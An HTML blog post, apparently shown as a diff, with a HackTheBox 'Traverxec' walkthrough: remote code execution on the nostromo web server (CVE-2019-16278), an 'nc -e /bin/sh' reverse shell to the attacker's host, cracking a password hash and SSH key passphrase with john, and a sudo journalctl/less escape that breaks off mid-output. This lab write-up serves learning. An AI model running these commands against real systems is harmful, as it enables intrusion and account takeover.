@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>Traverxec - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Traverxec was in my opinion a particular and interesting box. While being rated easy it still teach me a little trick and got me very frustrated at some point because it was super easy to overlook and overthink easy things. Still it was worth cogitate on it!
+Tl;Dr: The user flag was accessible after using a Remote Code Execution exploit on the nhttpd web server running, giving us access to the www-data user."/>
+<meta name="keywords" content="hackthebox, ctf, traverxec, nhttpd, nostromo, Directory Transversal, CVE-2019-16278, john, journalctl, less, GTFOBins"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/posts/traverxec/" />
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+
+<link rel="shortcut icon" href="/img/favicon.ico">
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Traverxec - HackTheBox"/>
+<meta name="twitter:description" content="Traverxec was in my opinion a particular and interesting box. While being rated easy it still teach me a few tricks and got me sometimes very frustrated because it was super easy to overlook and overthink easy things. Still it was worth cogitate on it!
+
+**Tl;Dr:** The user flag was accessible after using a Remote Code Execution exploit on the `nhttpd` web server running, giving us access to the `www-data` user. From here you were able to *enter* the user home directory and access to a backup archive containing its SSH private key. After brute-forcing the passphrase you could connect to the user account and grab the flag.  
+The root flag consisted in exploiting a misconfiguration in `sudo` config allowing to view `journalctl` entries as `root` without password. Since `journalctl` use `less` as a pager it was possible to break out from `less` running as `root` by spawning an interactive system shell.
+
+Alright! Let&#39;s get into the details now!
+"/>
+
+
+
+<meta property="og:title" content="Traverxec - HackTheBox" />
+<meta property="og:description" content="Traverxec was in my opinion a particular and interesting box. While being rated easy it still teach me a few tricks and got me sometimes very frustrated because it was super easy to overlook and overthink easy things. Still it was worth cogitate on it!
+
+**Tl;Dr:** The user flag was accessible after using a Remote Code Execution exploit on the `nhttpd` web server running, giving us access to the `www-data` user. From here you were able to *enter* the user home directory and access to a backup archive containing its SSH private key. After brute-forcing the passphrase you could connect to the user account and grab the flag.  
+The root flag consisted in exploiting a misconfiguration in `sudo` config allowing to view `journalctl` entries as `root` without password. Since `journalctl` use `less` as a pager it was possible to break out from `less` running as `root` by spawning an interactive system shell.
+
+Alright! Let&#39;s get into the details now!
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/traverxec/" />
+<meta property="article:published_time" content="2020-04-11T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-04-11T00:00:00+00:00" /><meta property="og:site_name" content="hg8&#39;s Notes" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">./hg8.sh</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        
+<nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/">Posts</a></li>
+        
+      
+        
+          <li><a href="/tags">Tags</a></li>
+        
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+      
+    
+    <li>
+<a href="/search" title="Search">
+<img src="/icon/search.svg" alt="search" height="20">
+</a>
+<li>
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/">Posts</a></li>
+      
+    
+      
+        <li><a href="/tags">Tags</a></li>
+      
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h2 class="post-title"><a href="/posts/traverxec/">Traverxec - HackTheBox</a></h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-04-11
+        </span>
+
+        
+          
+        
+      
+
+      <span class="post-author">— Written by hg8</span>
+      
+        <span class="post-read-time">— 10 min read</span>
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="/tags/hackthebox/">hackthebox</a>&nbsp;
+        
+          #<a href="/tags/ctf/">ctf</a>&nbsp;
+        
+          #<a href="/tags/traverxec/">traverxec</a>&nbsp;
+        
+          #<a href="/tags/nhttpd/">nhttpd</a>&nbsp;
+        
+          #<a href="/tags/nostromo/">nostromo</a>&nbsp;
+        
+          #<a href="/tags/directory-transversal/">Directory Transversal</a>&nbsp;
+        
+          #<a href="/tags/cve-2019-16278/">CVE-2019-16278</a>&nbsp;
+        
+          #<a href="/tags/john/">john</a>&nbsp;
+        
+          #<a href="/tags/journalctl/">journalctl</a>&nbsp;
+        
+          #<a href="/tags/less/">less</a>&nbsp;
+        
+          #<a href="/tags/gtfobins/">GTFOBins</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="/img/traverxec-hackthebox.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      <p>Traverxec was in my opinion a particular and interesting box. While being rated easy it still teach me a little trick and got me very frustrated at some point because it was super easy to overlook and overthink easy things. Still it was worth cogitate on it!</p>
+<p><strong>Tl;Dr:</strong> The user flag was accessible after using a Remote Code Execution exploit on the <code>nhttpd</code> web server running, giving us access to the <code>www-data</code> user. From here you were able to <em>enter</em> the user home directory and access to a backup archive containing its SSH private key. After brute-forcing the passphrase you could connect to the user account and grab the flag.<br>
+The root flag consisted in exploiting a misconfiguration in <code>sudo</code> config allowing to view <code>journalctl</code> entries as <code>root</code> without password. Since <code>journalctl</code> use <code>less</code> as a pager it was possible to break out from <code>less</code> running as <code>root</code> by spawning an interactive system shell.</p>
+<p>Alright! Let&rsquo;s get into the details now!</p>
+<hr>
+<p>First thing first, let&rsquo;s add the box IP to the hosts file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;10.10.10.165 traverxec.htb&#34;</span> &gt;&gt; /etc/hosts
+</code></pre></div><p>and let&rsquo;s start!</p>
+<h2 id="user-flag">User Flag</h2>
+<h3 id="recon">Recon</h3>
+<p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nmap -sV -sT -sC traverxec.htb
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-11-18 15:36 CET
+Nmap scan report <span style="color:#66d9ef">for</span> traverxec.htb <span style="color:#f92672">(</span>10.10.10.165<span style="color:#f92672">)</span>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+80/tcp open  http    nostromo 1.9.6
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>We have something super classical: A HTTP (port 80) and SSH (port 22) service open.</p>
+<p>But in this result something immediately catch the eye : <code>nostromo 1.9.6</code>. That&rsquo;s a really not common web server.</p>
+<p>According to its <a href="https://www.gsp.com/cgi-bin/man.cgi?section=8&amp;topic=nhttpd">documentation</a>:</p>
+<blockquote>
+<p>nhttpd is a simple, fast and secure HTTP server.  It runs as a single
+process, handling connections with select(2).</p>
+</blockquote>
+<p>And actually while searching for informations about this web server (out of curiosity) the second result on Google was about a RCE vulnerability through directory transversal on version &lt;= 1.9.6 (<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-16278">CVE-2019-16278</a>).<br>
+A bash proof-of-concept is also <a href="https://git.sp0re.sh/sp0re/Nhttpd-exploits">available</a>. Seems like we don&rsquo;t need to search any further&hellip;</p>
+<p>Let&rsquo;s give it a try:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ git clone https://git.sp0re.sh/sp0re/Nhttpd-exploits.git
+Cloning into <span style="color:#e6db74">&#39;Nhttpd-exploits&#39;</span>...
+remote: Enumerating objects: 5, <span style="color:#66d9ef">done</span>.
+remote: Counting objects: 100% <span style="color:#f92672">(</span>5/5<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+remote: Compressing objects: 100% <span style="color:#f92672">(</span>5/5<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+remote: Total <span style="color:#ae81ff">5</span> <span style="color:#f92672">(</span>delta 0<span style="color:#f92672">)</span>, reused <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>delta 0<span style="color:#f92672">)</span>
+Unpacking objects: 100% <span style="color:#f92672">(</span>5/5<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ cd Nhttpd-exploits
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ bash CVE-2019-16278.sh traverxec.htb <span style="color:#ae81ff">80</span> id
+uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+</code></pre></div><p>That was fast!</p>
+<p><em>Note: Be careful when launching exploit, do not use CVE-2019-16279.sh since it will DoS the box (<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-16279">CVE-2019-16279</a>)&hellip; It was a very hard box to solve because it would constantly get down probably because of people launching the wrong exploit by mistake.</em></p>
+<p>Let&rsquo;s now use it to open a reverse shell. First we start our listener:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
+Listening on any address <span style="color:#ae81ff">8585</span>
+</code></pre></div><p>And launch the exploit :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ bash CVE-2019-16278.sh traverxec.htb <span style="color:#ae81ff">80</span> <span style="color:#e6db74">&#34;nc -e /bin/sh 10.10.10.10 8585&#34;</span>
+</code></pre></div><p>We get the connection immediately:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
+Listening on any address <span style="color:#ae81ff">8585</span>
+Connection from 10.10.10.165:40048
+www-data@traverxec:/$ id
+uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+</code></pre></div><p>First thing first let&rsquo;s see what the user is to locate the <code>user.txt</code> flag:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@traverxec:/$ ls -la /home/
+drwx--x--x  <span style="color:#ae81ff">6</span> david david <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">19</span> 05:28 david
+www-data@traverxec:/$ ls -la /home/david/
+ls: cannot open directory <span style="color:#e6db74">&#39;/home/david/&#39;</span>: Permission denied
+</code></pre></div><p>The user is <code>david</code> but unfortunately we have no rights to read or write files in his home directory. Let&rsquo;s move on, we might find additional informations later.</p>
+<h3 id="pivot-www-data---david">Pivot www-data -&gt; david</h3>
+<p>Looking around we find the configuration of the <code>nostromo</code> web server, hopefully we can find juicy informations there ?</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@traverxec:/$ cat /var/nostromo/conf/nhttpd.conf
+<span style="color:#75715e"># MAIN [MANDATORY]</span>
+servername        traverxec.htb
+serverlisten        *
+serveradmin        david@traverxec.htb
+serverroot        /var/nostromo
+servermimes        conf/mimes
+docroot            /var/nostromo/htdocs
+docindex        index.html
+<span style="color:#75715e"># LOGS [OPTIONAL]</span>
+logpid            logs/nhttpd.pid
+<span style="color:#75715e"># SETUID [RECOMMENDED]</span>
+user            www-data
+<span style="color:#75715e"># BASIC AUTHENTICATION [OPTIONAL]</span>
+htaccess        .htaccess
+htpasswd        /var/nostromo/conf/.htpasswd
+<span style="color:#75715e"># ALIASES [OPTIONAL]</span>
+/icons            /var/nostromo/icons
+<span style="color:#75715e"># HOMEDIRS [OPTIONAL]</span>
+homedirs        /home
+homedirs_public        public_www
+</code></pre></div><p>The configuration gives the path to an <code>.htpasswd</code> file :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@traverxec:/$ cat /var/nostromo/conf/.htpasswd
+david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
+</code></pre></div><p>Maybe if we brute-force the password of this <code>.htpasswd</code> file we can reuse the found password to login as <code>david</code> to ssh. Let&rsquo;s give it a try:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;</span>$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ<span style="color:#e6db74">/&#34;</span> &gt; david.hash
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ john --wordlist<span style="color:#f92672">=</span>~/SecLists/Passwords/Leaked-Databases/rockyou.txt david.hash
+Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>md5crypt, crypt<span style="color:#f92672">(</span>3<span style="color:#f92672">)</span> $1$ <span style="color:#f92672">(</span>and variants<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>MD5 128/128 AVX 4x3<span style="color:#f92672">])</span>
+Will run <span style="color:#ae81ff">2</span> OpenMP threads
+Nowonly4me       <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>
+Session completed
+</code></pre></div><p>Alright! We managed to get the password. That&rsquo;s a good news and a nice step. Let&rsquo;s try to login as <code>david</code> now:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh david@traverxec.htb
+david@traverxec.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
+Permission denied, please try again.
+</code></pre></div><p>No luck&hellip; <code>su - david</code> maybe ?</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@traverxec:/$ su - david
+Password:
+su: Authentication failure
+www-data@traverxec:/$
+</code></pre></div><p>Nop! Looks like a dead end here&hellip; Let&rsquo;s go back at the beginning to make sure we didn&rsquo;t miss anything.</p>
+<p>First let&rsquo;s check again the <code>nhttpd.conf</code> file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+<span style="color:#75715e"># HOMEDIRS [OPTIONAL]</span>
+homedirs        /home
+homedirs_public        public_www
+</code></pre></div><p>This <code>HOMEDIRS</code> option catch my eye, does that mean we could access <code>david</code> home directory using the web-server ? Let&rsquo;s check the documentation:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@traverxec:/$ man nhttpd
+HOMEDIRS
+To serve the home directories of your users via HTTP, enable the homedirs option by defining the path in where the home directories are stored, normally /home. To access a users home directory enter a ~ in the URL followed by the home directory name like in this example:
+http://www.nazgul.ch/~hacki/
+The content of the home directory is handled exactly the same way as a directory in your document root. If some users don<span style="color:#960050;background-color:#1e0010">&#39;</span>t want that their home directory can be accessed via HTTP, they shall remove the world readable flag on their home directory and a caller will receive a <span style="color:#ae81ff">403</span> Forbidden response. Also, <span style="color:#66d9ef">if</span> basic authentication is enabled, a user can create an .htaccess file in his home directory and a caller will need to authenticate.
+You can restrict the access within the home directories to a single sub directory by defining it via the homedirs_public option.
+</code></pre></div><p>Thats interesting!<br>
+Ok so we know our user is David, can we access his homedir?</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">[hg8@archbook ~]$ curl http://traverxec.htb/\~david/
+</span><span style="color:#960050;background-color:#1e0010">&lt;html&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;body&gt;&lt;font style=&#34;sans-serif&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;h1&gt;Private space.&lt;br&gt;Nothing here.
+</span><span style="color:#960050;background-color:#1e0010">&lt;br&gt;Keep out!&lt;/h1&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;/body&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;/html&gt;
+</span></code></pre></div><p>&ldquo;Nothing to see here&rdquo;&hellip; That&rsquo;s true, and running <code>gobuster</code> won&rsquo;t help either. We need to find a way to list files and directories in <code>david</code> homedir, but how ? And this is where I got frustrated&hellip; After searching for a while I realized I overlooked something obvious. Let&rsquo;s check again the permissions of <code>david</code> homedir:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@traverxec:/$ ls -l /home/david/
+ls: cannot open directory <span style="color:#e6db74">&#39;/home/david&#39;</span>: Permission denied
+www-data@traverxec:/$ ls -l /home/
+total <span style="color:#ae81ff">4</span>
+drwx--x--x <span style="color:#ae81ff">5</span> david david <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">22</span> 12:15 david
+</code></pre></div><p>We indeed have no read nor write permissions, but we do have execute bit is set (<code>x</code>).</p>
+<p>For a binary the <code>x</code> bit mean the file can be executed. But for directory, what does it mean then ?</p>
+<blockquote>
+<p>The execute bit (<code>x</code>) allows the affected user to enter the directory, and access files and directories inside.</p>
+</blockquote>
+<p>So we can not read nor write <code>david</code> homedir but we can enter it! Let&rsquo;s give a try:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@traverxec:/$ cd /home/david/public_www/
+cd /home/david/public_www/
+www-data@traverxec:/home/david/public_www$ ls -l
+ls -l
+total <span style="color:#ae81ff">8</span>
+-rw-r--r-- <span style="color:#ae81ff">1</span> david david  <span style="color:#ae81ff">402</span> Oct <span style="color:#ae81ff">25</span> 15:45 index.html
+drwxr-xr-x <span style="color:#ae81ff">2</span> david david <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">25</span> 17:02 protected-file-area
+</code></pre></div><p>It worked! Once inside we notice another interesting folder: <code>protected-file-area</code>. Let&rsquo;s see what&rsquo;s it:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@traverxec:/home/david/public_www/protected-file-area$ ls
+backup-ssh-identity-files.tgz
+</code></pre></div><p>A backup of ssh identity files ? This sure looks promising. Let&rsquo;s extract it:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@traverxec:/home/david/public_www/protected-file-area$ mkdir /tmp/.tmp
+www-data@traverxec:/home/david/public_www/protected-file-area$ tar -xzf backup-ssh-identity-files.tgz -C /tmp/.tmp
+www-data@traverxec:/home/david/public_www/protected-file-area$ cd /tmp/.tmp/home/david/
+www-data@traverxec:/tmp/tmp/home/david$ ls -la .ssh/
+-rw-r--r-- <span style="color:#ae81ff">1</span> www-data www-data  <span style="color:#ae81ff">397</span> Oct <span style="color:#ae81ff">25</span> 17:02 authorized_keys
+-rw------- <span style="color:#ae81ff">1</span> www-data www-data <span style="color:#ae81ff">1766</span> Oct <span style="color:#ae81ff">25</span> 17:02 id_rsa
+-rw-r--r-- <span style="color:#ae81ff">1</span> www-data www-data  <span style="color:#ae81ff">397</span> Oct <span style="color:#ae81ff">25</span> 17:02 id_rsa.pub
+</code></pre></div><p>Jackpot! We can now try to use this ssh key to access <code>david</code> account:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh -i id_rsa david@traverxec.htb
+Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;id_rsa&#39;</span>:
+</code></pre></div><p>It couldn&rsquo;t have been this easy right? A passphrase is needed for this ssh key. Let&rsquo;s fire <code>john</code> to see if we can brute-force the passphrase:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh2john id_rsa &gt; id_rsa.hash
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ john --wordlist<span style="color:#f92672">=</span>~/SecLists/Passwords/Leaked-Databases/rockyou.txt id_rsa.hash
+Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>SSH <span style="color:#f92672">[</span>RSA/DSA/EC/OPENSSH <span style="color:#f92672">(</span>SSH private keys<span style="color:#f92672">)</span> 32/64<span style="color:#f92672">])</span>
+Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+hunter           <span style="color:#f92672">(</span>ssh/id_rsa<span style="color:#f92672">)</span>
+Warning: Only <span style="color:#ae81ff">1</span> candidate left, minimum <span style="color:#ae81ff">2</span> needed <span style="color:#66d9ef">for</span> performance.
+1g 0:00:00:12 DONE <span style="color:#f92672">(</span>2019-11-18 11:06<span style="color:#f92672">)</span> 0.08012g/s 1149Kp/s 1149Kc/s 1149KC/s *7¡Vamos!
+Session completed
+</code></pre></div><p><code>john</code> found <code>hunter</code> as a passphrase. We have all the pieces to login now:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh -i id_rsa david@traverxec.htb
+Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;id_rsa&#39;</span>:
+Linux traverxec 4.19.0-6-amd64 <span style="color:#75715e">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span>
+david@traverxec:~$ cat user.txt
+7xxxxxxxxxxxxxxxxxxxxxd
+</code></pre></div><h2 id="root-flag">Root Flag</h2>
+<h3 id="recon-1">Recon</h3>
+<p>First thing first, let&rsquo;s check what&rsquo;s inside <code>david</code> home directory:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">david@traverxec:~$ ls -l
+total <span style="color:#ae81ff">12</span>
+drwx------ <span style="color:#ae81ff">2</span> david david <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">22</span> 12:41  bin
+drwxr-xr-x <span style="color:#ae81ff">3</span> david david <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">25</span> 15:45  public_www
+-r--r----- <span style="color:#ae81ff">1</span> root  david   <span style="color:#ae81ff">33</span> Oct <span style="color:#ae81ff">25</span> 16:14  user.txt
+david@traverxec:~$ ls -l bin
+total <span style="color:#ae81ff">8</span>
+-r-------- <span style="color:#ae81ff">1</span> david david <span style="color:#ae81ff">802</span> Oct <span style="color:#ae81ff">25</span> 16:26 server-stats.head
+-rwx------ <span style="color:#ae81ff">1</span> david david <span style="color:#ae81ff">363</span> Oct <span style="color:#ae81ff">25</span> 16:26 server-stats.sh
+</code></pre></div><p>Let&rsquo;s first focus on the <code>bin</code> folder and <code>server-stats.sh</code> script:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">david@traverxec:~/bin$ cat server-stats.sh
+<span style="color:#75715e">#!/bin/bash</span>
+cat /home/david/bin/server-stats.head
+echo <span style="color:#e6db74">&#34;Load: `/usr/bin/uptime`&#34;</span>
+echo <span style="color:#e6db74">&#34; &#34;</span>
+echo <span style="color:#e6db74">&#34;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&#34;</span>
+echo <span style="color:#e6db74">&#34;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&#34;</span>
+echo <span style="color:#e6db74">&#34; &#34;</span>
+echo <span style="color:#e6db74">&#34;Last 5 journal log lines:&#34;</span>
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
+</code></pre></div><p>The line about <code>journalctl</code> looks particularly interesting since it&rsquo;s used with <code>sudo</code> command without password. If we can abuse this <code>journalctl</code> command we can potentially escalate our privileges to root.</p>
+<p>The best resource for finding example of abusing legitimate binaries is <a href="https://gtfobins.github.io/"><code>GTFOBins</code></a>:</p>
+<blockquote>
+<p>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p>
+<p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or  maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p>
+</blockquote>
+<p>According to it, <code>journalctl</code> can be used to elevate privileges thanks to the pager used (<code>less</code>):</p>
+<blockquote>
+<p><code>Less</code> can be used to break out from restricted environments by spawning an interactive system shell.</p>
+</blockquote>
+<p>Let&rsquo;s give it a try:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+-- Logs begin at Mon 2019-11-18 07:00:54 EST, end at Mon 2019-11-18
+Nov <span style="color:#ae81ff">18</span> 07:00:58 traverxec systemd<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>: Starting nostromo nhttpd serv
+Nov <span style="color:#ae81ff">18</span> 07:00:58 traverxec systemd<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>: nostromo.service: Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t open
+Nov <span style="color:#ae81ff">18</span> 07:00:58 traverxec nhttpd<span style="color:#f92672">[</span>477<span style="color:#f92672">]</span>: started
+Nov <span style="color:#ae81ff">18</span> 07:00:58 traverxec nhttpd<span style="color:#f92672">[</span>477<span style="color:#f92672">]</span>: max. file descriptors <span style="color:#f92672">=</span> <span style="color:#ae81ff">1040</span>
